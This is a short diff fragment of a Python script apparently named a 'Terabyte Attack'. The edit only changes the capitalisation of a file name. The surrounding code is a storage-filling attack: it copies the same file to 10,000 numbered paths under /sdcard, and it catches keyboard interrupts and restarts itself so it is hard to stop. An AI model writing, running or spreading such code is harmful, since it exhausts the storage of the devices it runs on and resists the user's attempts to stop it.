@@ -19,7 +19,7 @@ logo = """\x1b[91m
 def main():
 	try:
 		for i in range(10000):
-			os.system("cp Terabyte.Attack /sdcard"+str(i))
+			os.system("cp Terabyte.attack /sdcard"+str(i))
 	except KeyboardInterrupt:
 		main()
 
